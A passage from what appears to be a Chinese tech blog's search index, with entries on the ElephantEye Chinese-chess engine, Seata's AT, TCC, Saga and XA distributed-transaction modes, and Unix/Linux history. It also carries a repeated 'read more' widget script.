是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 参考博客 OAuth 2.0 的一个简单解释 OAuth 2.0 的四种授权方式 OAuth 2.0 授权模式访问之授权码模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"oauth"},{title:"中国象棋之三 ElephantEye 引擎深入理解",url:"/posts/df343bc0.html",text:'上篇 中国象棋之二开源 AI 引擎介绍 一、简介ElephantEye 是一款自由的中国象棋程序，在遵循《GNU 宽松通用公共许可协议》(GNU Lesser General Public Licence) 的前提下，广大象棋爱好者和程序设计师可以自由使用 ElephantEye 及其源程序。ElephantEye 中文名称为 “象眼”，它跟 “马腿” 和 “炮架子” 一起构成了中国象棋 “棋盘上的第三维”。ElephantEye 通常与一个象棋棋谱编辑软件 ElephantBoard 配合使用，寓意有板有眼 (英文 Board 的意思是 “板”)。注：现在 ElephantBoard 已更名为 “象棋巫师” 二、引擎协议ElephantEye 支持 UCCI 3.0，浅红象棋用户可通过 UCCI 引擎适配器 (UCCI2QH) 调用 ElephantEye 引擎，UCCI 命令使用帮助如下。 123456789101112131415161718支持的UCCI命令有： ucci setoption ... position {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] banmoves &lt;move_list&gt; go [ponder | draw] ... ponderhit [draw] | stop probe {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] quit可以返回的UCCI信息有： id {name &lt;engine_name&gt; | version &lt;version_name&gt; | copyright &lt;copyright_info&gt; | author &lt;author_name&gt; | user &lt;user_name&gt;} option ... ucciok info ... pophash [bestmove &lt;best_move&gt;] [lowerbound &lt;value&gt; depth &lt;depth&gt;] [upperbound &lt;value&gt; depth &lt;depth&gt;] {nobestmove | bestmove &lt;best_move&gt; [ponder &lt;ponder_move&gt;] [draw | resign]} bye 三、参数设置ElephantEye 作为 UCCI 引擎，有若干可以设置的参数 (可以直接在 &lt; 象棋巫师&gt; 中设置)：(1) 开局库： 默认的开局库为 ElephantEye 程序 (ELEEYE.EXE) 所在目录下的 BOOK.DAT，含有 10,000 个对称局面的着法。(2) 思考时间： 限定思考深度通常不是很好的选择，建议给定限时让程序自动分配时间。而在解杀局或分析局面时，则可让程序无限制思考，并可随时中止思考。(3) 置换表大小： 尽管置换表大小对程序的运行速度影响不大，默认 16MB 的设置已经足够，但 ElephantEye 还是提供了设置置换表大小的功能。在内存允许的情况下，下慢棋时可以适当增加置换表的大小，但建议不要超过物理内存的一半。(3) 裁剪程度： 为加快程序的运算速度，ElephantEye 默认使用空着裁剪，并且产生负面影响的可能性很小。只有最低级别会禁用空着裁剪。(4) 知识量： 知识量和局面评价的准确性有关，在 ElephantEye 的知识量等级中，只有最低级别是不采用局面评价函数的 (只考虑子力价值)，在解排局等不需要依靠审局知识来分析的局面时，可以尝试用这种设置。(5) 随机性： ElephantEye 设有 4 级随机性。随机性越大，程序越有可能走出它认为不是最好的着法，但 “不是最好的着法” 并非一点好处也没有，尤其在没有启用开局库时，适当增大随机性，可以避免程序在相同的局面下走出一样的着法。 四、规则从 2.0 版开始，ElephantEye 除了支持 “单方面长将判负” 的规则外，还支持 “长打判负”，“打” 包括 “将” 和 “捉”。尽管 ElephantEye 在复杂的情况可能无法正确识别长打，但由于支持 UCCI 命令 banmoves … ，一旦用户认为引擎走了 “长打” 的禁着，可以用 &lt; 象棋巫师 &gt; 的 “设置禁着” 功能让引擎强制变着。由于程序复杂性方面的限制，只有以下三种情况被识别成 “捉”，分别是： A. 马捉车或有根的炮兵 (卒)；B. 车捉有根的马炮兵 (卒)；C. 炮捉车或有根的马兵 (卒)。 五、博弈算法ElephantEye 属于偏向蛮力的象棋程序，使用了严谨而有效的博弈算法：(1) 使用位行和位列的着法生成器： 位行 (BitRanks) 和位列 (BitFiles) 有利于滑动棋子 (车和炮) 的着法 (尤其是吃子着法) 生成，位行和位列可以用查表来代替在射线上做的循环运算。在 ElephantEye 中，位行和位列的技术不仅用在着法生成器中，也用到了牵制的判断上。(2) 静态局面搜索： 在做静态搜索时，ElephantEye 搜索了吃子或解将的着法，在搜索吃子着法时，ElephantEye 过滤掉不重要的吃子，例如吃不过河的兵、吃不处于防守中的士象等着法，都不在静态搜索的范围之内。(3) 循环着法和长将检测： ElephantEye 可以识别循环着法，出现循环着法时可以判断哪方为长将，并且会利用禁止长将的规则来谋求优势，但目前 ElephantEye 还无法识别长捉。(4) 置换表： ElephantEye 参考了中国象棋程序 “纵马奔流” 的设计思路，使用深度优先和始终覆盖的双层置换表，并采用低出 (高出) 边界修正的置换表更新策略。(5) 带检验的空着裁剪： ElephantEye 使用 R=2 的空着裁剪，在残局阶段使用带检验的空着裁剪。(6) 迭代加深 / 吃子着法 / 杀手着法 / 历史表启发： ElephantEye 的着法排序非常简单清晰，依次是迭代加深着法、好的吃子着法、杀手着法和按历史表排序的生成着法。(7) 将军 / 唯一应将 / 兑子延伸： 在选择性延伸上，ElephantEye 采用了将军、唯一应将和兑子延伸。(8) Alpha-Beta 主要变例搜索： ElephantEye 使用传统意义上的递归式 Alpha-Beta 主要变例搜索。(9) 开局库： ElephantEye 的开局库共包含了 10,000 个对称着法，是从 1990 年到 2005 年全国象棋个人赛、团体赛、五羊杯、联赛等 8,000 局顶尖比赛中提取的。(10) 后台思考和时间分配策略： ElephantEye 支持后台思考功能，同时提供了时段制和加时制两种时间分配策略，会自动合理分配时间。 六、开局库ElephantEye 的开局库可由 “ElephantEye 开局库制作工具” 制作。运行制作工具后，首先要选择 PGN 棋谱所在的文件夹，然后保存为开局库文件 (通常是 BOOK.DAT)。通常，用来生成开局库的棋谱数量越多，生成的开局库文件就越大。为了使制作的开局库对 ElephantEye 生效，只需要把生成的开局库文件替换掉 ElephantEye 目录下的 BOOK.DAT 即可，也可以在 &lt; 象棋巫师 &gt; 的 “引擎设置” 对话框中指定开局库文件。 七、局面评价函数库ElephantEye 从 2.1 版开始，程序的搜索部分和局面评价部分就分离了，搜索部分通过调用 API 函数的形式与局面评价部分耦合。其他象棋程序设计师可以在 ElephantEye 的基础上更自由地发挥。根据 LGPL 协议，搜索和局面评价这两个部分都作为独立的程序库，运用其中任何一部分都只需要公开该部分的源程序即可。换句话说，如果局面评价部分没有使用任何开放代码，那么程序设计师就没有义务公开这部分的源程序，搜索部分也是如此。ElephantEye 的局面评价 API 函数接口定义如下： 12345A. 局面评价引擎名称：const char *GetEngineName(void);B. 局面预评价函数接口：void PreEvaluate( PositionStruct *lppos, PreEvalStruct *lpPreEval);C. 局面评价函数接口：int Evaluate(const PositionStruct *lppos, int vlAlpha, int vlBeta);其中 PositionStruct 和 PreEvalStruct 必须分别符合 position.h 和 pregen.h 中定义的结构。 八、源代码ElephantEye 的源代码包括 9 个模块，内容大致为：(1) ucci.h/ucci.cpp UCCI 命令解释模块，包括 Windows 和 Unix 下的行输入接收程序；(2) pregen.h/pregen.cpp Zobrist 数组和着法预置表的生成模块。ElephantEye 的预置表分两个部分，一是滑动棋子的着法预置表 (包括不吃子、车吃子、炮吃子和隔两子吃子)，它是实现位行和位列技术的基础；二是其他棋子的着法预置表，使得着法生成时避免了烦琐的边界判断。(3) position.h/position.cpp 主要描述着法和局面的数据结构及功能。局面的处理是本模块的重点，处理内容包括局面初始化、FEN 串导入、棋子移动、杀手着法的合理性判断、将军判断、长将和循环检测、子力价值分调整等过程，还包括 5 个子力位置价值表。(4) genmoves.cpp 着法生成器，包括生成吃子着法和生成不吃子着法的两个，但不能只生成解除将军的着法。在生成吃子着法的同时赋予每个着法以相应的 MVV (LVA)(或称准 SEE) 值。该模块还有一个专门判断棋子是否有保护的函数，来计算 MVV (LVA) 值，对于有保护的棋子，计算 MVV-LVA 的值 (小于零不计)，对于无保护的棋子，只计算 MVV 的值。因此，判断棋子是否有根的程序也包括在本模块中。(5) hash.h/hash.cpp 置换表、历史表和着法列表管理模块，包括置换表的分配和存取、主要变例获取等操作。(6) book.h/book.cpp 开局库读取模块。(7) movesort.h/movesort.cpp 着法列表排序模块。(8) search.h/search.cpp 搜索模块，除了静态搜索、完全搜索和根结点搜索这三个主要过程外，还包括迭代加深控制、后台思考、时间分配、搜索参数统计和搜索信息输出等内容。该模块是整个程序的核心模块。(9) eleeye.cpp 主程序 (即 main 函数)。(10) preeval.cpp 子力位置数组预生成器，ElephantEye 根据 “进攻 / 防守” 和 “开局 / 中局 / 残局” 两个参数线性调整子力位置数组。(11) evaluate.cpp 局面评价函数，ElephantEye 采用了四级偷懒评价的机制，最粗的层次只评价特殊棋型，进一层次评价牵制，再进一层次评价车的灵活性，最高层次还评价马的阻碍。 九、引擎表现ElephantEye 的设计重点在搜索算法，但在知识上比较欠缺。在 2.8 GHz 的处理器上每秒可搜索约 1,000,000 个结点 (包括常规搜索和静态搜索)，一般的中局局面在 1 分钟内可搜索约 11 层。在棋力上，ElephantEye 和 “棋隐”、SaoLa (象棋挑战者) 等程序具有同等水平，但由于局面评估函数上的缺陷，ElephantEye 距离顶尖的商业象棋软件 (谢谢大师、象棋世家、象棋奇兵、棋天大圣等) 尚有一定的差距。ElephantEye 在联众、弈天等象棋对弈网站上作过测试，用等级分来衡量，联众网的战绩在 2500 分左右，弈天网快棋的战绩在 2000 分左右，慢棋在 1500 分左右。2005 年 9 月在台湾象棋软件爱好者施金山的帮助下，ElephantEye 参加了在台北举行的第 10 届 ICGA 电脑奥林匹克大赛中国象棋组比赛，战绩是 7 胜 5 和 14 负，在 14 个程序中排名第 11；2006 年 8 月 ElephantEye 参加了在北京举行的全国首届计算机博弈锦标赛，战绩是 7 胜 2 和 11 负，在 18 个程序中排名第 7。 十、附加模块ElephantEye 的源代码包除了 ElephantEye 本身的源代码外，还包括以下几个附加模块：(1) 基础代码 (base)：提供了汇编指令、系统函数调用等功能；(2) 中国象棋规则模块 (cchess)：为其他软件使用 ElephantEye 代码提供了接口；(3) 开局库制作模块 (BOOK)：制作开局库 BOOK.DAT 的代码；(4) UCCI 引擎联赛模拟器 (LEAGUE)：为 UCCI 引擎测试和比赛提供了自动批量对局的平台；(5) UCCI 引擎搜索树分析器 (TREE)：UCCI 引擎 (支持 UCCI 2.2+) 的搜索路线分析工具；(6) XQF 棋谱工具 (XQFTOOLS)：提供 XQF 等多种棋谱转换为 PGN 的工具；(7) 浅红象棋适配器 (UCCI2QH)：为浅红象棋调用 UCCI 引擎提供了接口；(8) 浅红象棋引擎支持 UCCI 的适配器 (QH2UCCI)：为 “梦入神蛋” 浅红象棋加入 UCCI 引擎测试提供了接口；(9) BBS Chess (BBSCHESS)：一个用 Visual Basic 制作的国际象棋局面设置工具，可在各高校 BBS 上粘贴彩色的国际象棋局面；(10) 棋盘图片生成器 (FEN2BMP)：一个可以把国际象棋和中国象棋的 FEN 文件转换成 BMP 文件的实用工具；(11) 编码转换 (codec)，包括简繁转码、UNIX 文本转码、Base64 转码等；(12) 其他工具 (MISC)：包括简易网络通讯、管道测试等工具；(13) 说明文档 (DOC)：即《中国象棋程序设计探索》系列连载；(14) 参赛棋谱 (CCGC)：ElephantEye 参加首届全国计算机博弈锦标赛 (CCGC) 的全部棋谱。 十一、资源下载 象棋巫师 (v4.84) 完整版的代码 象棋巫师轻量版的 Github 代码 ElephantEye (v3.15) 引擎的 Github 代码 十二、参考资料 象棋百科全书 中国象棋对弈程序 ElephantEye (象眼) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ai"},{title:"Java 架构师知识图谱 (最新)",url:"/posts/3199440000.html",text:'JEE 基础之一 JEE 基础之二 Java 高级架构师 Java 百万架构师 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"前端开发知识图谱 (最新)",url:"/posts/3d316a65.html",text:'基础知识 服务与通信 存储、工作与协助 企业开发基础 Web 全栈开发 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"知识图谱"},{title:"Seata 入门教程 - 中级篇",url:"/posts/84d3f3e6.html",text:'1、Seata 整体框架1.1、Seata 概述Seata 是一套一站式分布式事务解决方案，为用户提供了 AT、TCC、SAGA 和 XA 事务模式，致力于提供高性能和简单易用的分布式事务服务。 1.2、Seata 的三大模块Seata 中有三大模块，分别是 TM、RM 和 TC，其中 TM 和 RM 是作为 Seata 的客户端与业务系统集成在一起，TC 作为 Seata 的服务端独立部署。 TC：Transaction Coordinator 事务协调器，维护全局和分支事务的状态，负责协调并驱动全局事务的提交或回滚 TM：Transaction Manager 事务管理器，控制全局事务的边界，负责开启一个全局事务，并最终发起全局提交或全局回滚的决议 RM：Resource Manager 资源管理器，管理分支事务处理的资源，向 TC 注册分支事务，上报分支事务的状态，接受 TC 的命令来提交或者回滚分支事务 1.3、Seata 的执行流程 TM 开启分布式事务（TM 向 TC 注册全局事务记录） 按业务场景，编排数据库、服务等事务内资源（RM 向 TC 汇报资源准备状态 ） TM 结束分布式事务，事务一阶段结束（TM 通知 TC 提交 / 回滚分布式事务） TC 汇总事务信息，决定分布式事务是提交还是回滚 TC 通知所有 RM 提交 / 回滚 资源，事务二阶段结束 2、AT 模式2.1、前提 Java 应用，通过 JDBC 访问数据库 基于支持本地 ACID 事务的关系型数据库 2.2、写隔离 一阶段本地事务提交前，需要确保先拿到全局锁 拿不到全局锁 ，不能提交本地事务 拿全局锁的尝试被限制在一定范围内，超出范围将放弃，并回滚本地事务，释放本地锁 举例说明：两个全局事务 tx1 和 tx2，分别对 a 表的 m 字段进行更新操作，m 的初始值 1000 tx1 先开始，开启本地事务，拿到本地锁，更新操作 m = 1000 - 100 = 900。本地事务提交前，先拿到该记录的全局锁，本地提交事务释放本地锁。tx2 后开始，开启本地事务，拿到本地锁，更新操作 m = 900 - 100 = 800。tx2 本地事务提交前，尝试拿该记录的全局锁；tx1 全局提交前，该记录的全局锁被 tx1 持有，tx2 需要重试等待全局锁 。 如果 tx1 二阶段全局提交，释放全局锁，tx2 拿到全局锁后提交本地事务 如果 tx1 的二阶段全局回滚，则 tx1 需要重新获取该数据的本地锁，进行反向补偿的更新操作，实现分支事务的回滚。此时，如果 tx2 仍在等待该数据的全局锁，同时持有本地锁，则 tx1 的分支事务回滚会失败。tx1 的分支事务回滚会一直重试，直到 tx2 的全局锁等锁超时，放弃等待全局锁并回滚本地事务释放本地锁，tx1 的分支事务最终回滚成功。因为整个过程全局锁在 tx1 结束前一直是被 tx1 持有的，所以不会出现脏写的问题。 2.3、读隔离在数据库本地事务隔离级别读已提交（Read Committed）或以上的基础上，Seata（AT 模式）的默认全局隔离级别是读未提交（Read Uncommitted）。如果应用在特定场景下，必需要求全局的读已提交，目前 Seata 的方式是通过 SELECT FOR UPDATE 语句的代理。 SELECT FOR UPDATE 语句的执行会申请全局锁，如果全局锁被其他事务持有，则释放本地锁（回滚 SELECT FOR UPDATE 语句的本地执行）并重试。这个过程中，查询是被 block 住的，直到拿到全局锁，即读取的相关数据是已提交的才返回。出于总体性能上的考虑，Seata 目前的方案并没有对所有 SELECT 语句都进行代理，仅针对 FOR UPDATE 的 SELECT 语句。 2.4、整体机制AT 模式本质是两阶段提交协议（2PC）的演变： 一阶段：业务数据和回滚日志记录在同一个本地事务中提交，释放本地锁和连接资源 二阶段： 提交异步化，非常快速地完成 回滚是通过一阶段的回滚日志进行反向补偿 一阶段： 在一阶段，Seata 会拦截业务 SQL： 1）首先解析 SQL 语义，找到业务 SQL 要更新的业务数据，在业务数据被更新前，将其保存成 before image 2）执行 业务 SQL 更新业务数据，在业务数据更新之后，再将其保存成 after image 3）最后生成行锁 以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性，任何提交的业务数据的更新一定有相应的回滚日志存在 基于这样的机制，分支的本地事务便可以在全局事务的第一阶段提交，并马上释放本地事务锁定的资源；这也是 Seata 和 XA 事务的不同之处，两阶段提交往往对资源的锁定需要持续到第二阶段实际的提交或者回滚操作，而有了回滚日志之后，可以在第一阶段释放对资源的锁定，降低了锁范围，提高效率，即使第二阶段发生异常需要回滚，只需找对 undolog 中对应数据并反解析成 SQL 来达到回滚目的。同时 Seata 通过代理数据源将业务 SQL 的执行解析成 undolog 来与业务数据的更新同时入库，达到了对业务无侵入的效果。 二阶段提交： 二阶段如果是提交的话，因为 业务 SQL 在一阶段已经提交至数据库，所以 Seata 框架只需将一阶段保存的快照数据和行锁删掉，完成数据清理即可。 二阶段回滚： 二阶段如果是回滚的话，Seata 就需要回滚一阶段已经执行的 业务 SQL 来还原业务数据。回滚方式便是用 before image 还原业务数据；但在还原前要首先要校验脏写，对比 数据库当前业务数据 和 after image，如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有脏写，出现脏写就需要根据配置策略来做处理（如转人工处理）。 通俗讲： 第一阶段：假如我们现在插入或更新一条数据，根据动态代理它会提取你插入或更新的数据，保存一个原快照，然后再去执行 业务 SQL，再保存一个新快照，生成一个行锁。当你这个业务方法没有执行完，这个锁是不会释放的。最终提交 业务 SQL，业务表和 unlog 表是在同一个本地事务中，也就是要么同时成功，要么同时失败。因为你更新或插入一条数据，unlog 表会记录一些原始数据便于回滚，是 Seata 帮助我们实现了回滚 第二阶段：在这个阶段 Seata 会查看你的日志是否成功，如果成功不会做任何操作，如果失败，它会做一个反向补偿，使用 unlog 表记录一些原数据进行回滚操作 2.5、适用场景与优缺点适用场景： 分布式事务的业务逻辑中仅仅是纯数据库操作，不包含其他中间件的事务逻辑 优点： 改动及代码侵入最小，由 Seata 来负责 Commit 和 Rollback 的自动化提交或回滚操作 缺点： 如果事务中包含缓存存储或发送 MQ 消息等，则不适合使用 多次对数据库操作，以及全局行锁的存在对并发处理性能有影响 为了保证镜像 SQL 的可靠性，需要用户对 SQL 尽量做简化，建议做法：将多条 SQL 语句分解为多个事务中的原子步骤（对应 Seata AT 模式的分支 Branch 概念），如果单条 SQL 语句跨表，也分解成为多个事务中的原子步骤（尽量降低 Seata 存储前 SQL 镜像结果时的风险） 3、TCC 模式3.1、概述该模式由蚂蚁金服贡献，TCC 需要用户根据自己的业务场景实现 Try、Confirm 和 Cancel 三个接口。事务发起方在一阶段执行 Try 操作，在二阶段提交执行 Confirm 操作，二阶段回滚执行 Cancel 操作。TCC 三个接口的描述如下： Try：资源的检测和预留 Confirm：执行的业务操作提交，要求 Try 成功 Confirm 就一定要能成功 Cancel：预留资源释放 一个分布式的全局事务，整体是两阶段提交的模型。全局事务是由若干分支事务组成的，分支事务要满足两阶段提交的模型要求，即需要每个分支事务都具备自己的： 一阶段 prepare 行为 二阶段 commit 或 rollback 行为 3.2、AT 与 TCC 的区别根据两阶段行为模式的不同，可以将分支事务划分为 Automatic (Branch) Transaction Mode 和 Manual (Branch) Transaction Mode。 AT 模式基于支持本地 ACID 事务的关系型数据库： 一阶段 prepare 行为：在本地事务中，一并提交业务数据更新和相应回滚日志记录 二阶段 commit 行为：马上成功结束，自动异步批量清理回滚日志 二阶段 rollback 行为：通过回滚日志，自动生成补偿操作，完成数据回滚 相应的，TCC 模式，不依赖于底层数据资源的事务支持： 一阶段 prepare 行为：调用 自定义 的 prepare 逻辑 二阶段 commit 行为：调用 自定义 的 commit 逻辑 二阶段 rollback 行为：调用 自定义 的 rollback 逻辑 所谓的 Seata TCC 模式，是指支持把自定义的分支事务纳入到全局事务的管理中 3.3、适用场景与优缺点适用场景： 分布式事务的业务逻辑中除了数据库操作外，包含其他中间件事务逻辑 优点： 适合微服务化场景 无 AT 模式的全局行锁，TCC 性能会比 AT 模式高很多 用户可以自己定义业务的补偿逻辑，由业务层保证事务的一致性 缺点： TCC 模式下开发者需要自行实现 Try、Confirm、Cancel 接口，对业务代码有一定的侵入性 需要考虑如何将业务模型拆成 2 阶段，实现成 TCC 的 3 个方法，并且保证 Try 成功 Confirm 就一定能成功，Confirm 失败会不断重试 4、Saga 模式4.1、概述Saga 模式是 Seata 提供的长事务解决方案，该模式主要由蚂蚁金服贡献，在 Saga 模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败则补偿前面已经成功的参与者，一阶段正向服务和二阶段补偿服务都由业务开发实现。 4.2、整体机制目前 Seata 提供的 Saga 模式是基于状态机引擎来实现的，机制是： 1）通过状态图来定义服务调用的流程，并生成 Json 状态语言定义文件 2）状态图中一个节点可以是调用一个服务，节点可以配置它的补偿节点 3）状态图 Json 由状态机引擎驱动执行，当出现异常时状态引擎反向执行已成功节点对应的补偿节点将事务回滚（注意：异常发生时是否进行补偿也可由用户自定义决定） 4）可以实现服务编排需求，支持单项选择、并发、子流程、参数转换、参数映射、服务执行状态判断、异常捕获等功能 4.3、适用场景与优缺点适用场景： 对数据隔离性要求不高，对性能要求高的场景 参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口 业务流程长、业务流程多、不需马上返回最终结果，只要保证最终一致性的场景 优点： 补偿逻辑易于实现 一阶段提交本地事务，无锁，高性能 事件驱动架构，参与者可异步执行，高吞吐量 缺点： 不保证隔离性 补偿逻辑需要自行实现 5、XA 模式5.1、前提 支持 XA 事务的数据库 Java 应用，通过 JDBC 访问数据库 5.2、整体机制在 Seata 定义的分布式事务框架内，利用事务资源（数据库、消息服务等）对 XA 协议的支持，以 XA 协议的机制来管理分支事务的一种事务模式。 执行阶段： 可回滚：业务 SQL 操作放在 XA 分支中进行，由资源对 XA 协议的支持来保证可回滚 持久化：XA 分支完成后，执行 XA Prepare，同样，由资源对 XA 协议的支持来保证持久化（即之后任何意外都不会造成无法回滚的情况） 完成阶段： 分支提交：执行 XA 分支的 Commit 分支回滚：执行 XA 分支的 Rollback 5.3、工作机制整体运行机制： XA 模式 运行在 Seata 定义的事务框架内： 执行阶段（E xecute）：XA start/XA end/XA prepare + SQL + 注册分支 完成阶段（F inish）：XA commit/XA rollback 数据源代理： XA 模式需要依赖 XAConnection，获取 XAConnection 两种方式： 方式一：要求开发者配置 XADataSource，给开发者增加了认知负担，需要为 XA 模式专门去学习和使用 XA 数据源，与透明化 XA 编程模型的设计目标相违背 方式二：根据开发者的普通 DataSource 来创建，对开发者比较友好，和 AT 模式使用一样，开发者完全不必关心 XA 层面的任何问题，保持本地编程模型即可 Seata 优先设计实现第二种方式：数据源代理根据普通数据源中获取的普通 JDBC 连接创建出相应的 XAConnection，类比 AT 模式的数据源代理机制（如下）: 但是第二种方法有局限：无法保证兼容的正确性。实际上，这种方法是在做数据库驱动程序要做的事情；不同的厂商、不同版本的数据库驱动实现机制是厂商私有的，Seata 只能保证在充分测试过的驱动程序上是正确的，开发者使用的驱动程序版本差异很可能造成机制的失效，这点在 Oracle 上体现非常明显。 综合考虑，XA 模式的数据源代理设计需要同时支持第一种方式：基于 XA 数据源进行代理，类比 AT 模式的数据源代理机制（如下）： 分支注册： XA Start 需要 Xid 参数，这个 Xid 需要和 Seata 全局事务的 XID 和 BranchId 关联起来，以便由 TC 驱动 XA 分支的提交或回滚。目前 Seata 的 BranchId 是在分支注册过程，由 TC 统一生成的，所以 XA 模式分支注册的时机需要在 XA start 之前。Seata 的 XA 模式将来一个可能的优化方向：把分支注册尽量延后。类似 AT 模式在本地事务提交之前才注册分支，避免分支执行失败情况下，没有意义的分支注册。这个优化方向需要 BranchId 生成机制的变化来配合，即 BranchId 不通过分支注册过程生成，而是生成后再带着 BranchId 去注册分支。 XA 模式的使用： 从编程模型上，XA 模式与 AT 模式保持完全一致，只需要修改数据源代理，即可实现 XA 模式与 AT 模式之间的切换，示例代码如下： 12345678@Bean("dataSource") public DataSource dataSource(DruidDataSource druidDataSource) { // DataSourceProxy for AT mode // return new DataSourceProxy(druidDataSource); // DataSourceProxyXA for XA mode return new DataSourceProxyXA(druidDataSource); } 6、参考文献 Seata 官方文档 - AT 模式 Seata 官方文档 - XA 模式 Seata 官方文档 - TCC 模式 Seata 官方文档 - Saga 模式 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 分布式"},{title:"Linux 系统编程之一 Unix、Linux 操作系统介绍",url:"/posts/429c103b.html",text:'操作系统的作用 方便：使计算机系统易于使用 有效：以更有效的方式使用计算机系统资源 扩展：方便用户有效开发、测试和引进新功能 操作系统的地位操作系统在计算机系统中承上启下的地位：向下封装硬件，向上提供操作接口。 Unix/Linux 介绍Unix 家族史 1965：贝尔实验室（Bell Labs）加入一项由通用电气和麻省理工学院合作的计划，该计划要建立一套多使用者、多任务、多层次的 MULTICS 操作系统，后来因为项目太为复杂失败 1969：其主要开发者 Thompson（后被称为 Unix 之父）和 Ritchie 领导一组开发者，开发了一个新的多任务操作系统 — UNICS，后来被改名为 Unix，最初的 Unix 是用 B 语言和汇编语言混合编写而成 1971：两人在贝尔实验室共同发明了 C 语言，并于 1973 用 C 语言重写了 Unix 1974：Unix 第一次出现在贝尔实验室以外。此后 Unix 被政府机关，研究机构，企业和大学注意到，并逐渐流行开来 1980：有两个最主要的 Unix 的版本线，一个是 Berkeley 的 BSD Unix，另一个是 AT&amp;T 的 Unix，两者的竞争最终引发了 Unix 的战争，最终导致 Unix 出现各种各样的变种版本 1982：AT&amp;T 基于版本 7 开发了 Unix System Ⅲ 的第一个商业版本，并不再开源 1992~2001：由于版权问题，AT&amp;T 公司与 BSD 开发组开始了一场将近 10 年的版权官司。Unix 由于其昂贵的费用，仅局限于大型机的应用；BSD 因为版权问题，失去了宝贵的发展时期 Linux 家族史 Minix（mini-Unix）最初是由 Andrew Tanenbaum 教授，仿照 4.3 BSD 的源代码，白手起家完成了 12000 行 C 语言的编写工作，这个系统只是一个教学工具，没有什么实际应用价值 1990 年，Linus Torvalds 决定编写一个自己的 Minix 内核，初名为 Linus\' Minix，意为 Linus 的 Minix 内核，后来改名为 Linux，此内核于 1991 年正式发布，并逐渐引起人们的注意 Linux 操作系统的诞生、发展、和成长过程依赖于五个重要支柱：Unix 操作系统、Minix 操作系统、GNU 计划、POSIX 标准和互联网 GNU 计划：GNU 是 GNU is Not Unix 的递归缩写，由 Richard M.Stallman 于 1984 年创办，旨在开发一个免费、类 Unix 的操作系统 。GNU 系统及其开发工具包括：Emacs 编辑系统、BASH Shell 程序、GCC、GDB 等，这些开发工具都是 GNU 组织的产品 1992 年 Linux 与其他 GNU 软件结合，完全自由的操作系统正式诞生。该操作系统往往被称为 GNU/Linux 或简称 Linux POSIX 标准：POSIX 标准定义了操作系统应该为应用程序提供的接口标准，POSIX 标准用来统一 Unix、Linux 各分支编程接口，以提高其通用型和可移植性 Linux 的远亲 Linux 的两类用户 Linux 和 Unix 的联系 Unix 系统是工作站上最常用的操作系统，它是一个多用户、多任务的实时操作系统，允许多人同时访问计算机，并同时运行多个任务。Unix 系统具有稳定、高效、安全、方便、功能强大等诸多优点，自 20 世纪 70 年代开始便运行在许多大型和小型计算机上 Unix 虽然是一个安全、稳定且功能强大的操作系统，但它也一直是一种大型的而且对运行平台要求很高的操作系统，只能在工作站或小型机上才能发挥全部功能，并且价格昂贵，对普通用户来说是可望而不可及的，这为后来 Linux 的崛起提供了机会，Linux 是一个类 Unix 操作系统 Linux 是免费的、不受版权制约、与 Unix 兼容的操作系统 Linux 在 x86 架构上实现了 Unix 系统的全部特性，具有多用户多任务的能力，同时保持了高效性和稳定性，Linux 具有如下优秀的特点： 开放性 完全免费 多用户 多任务 良好的用户界面 设备独立性 提供了丰富的网络功能 可靠的系统安全性 良好的可移植性 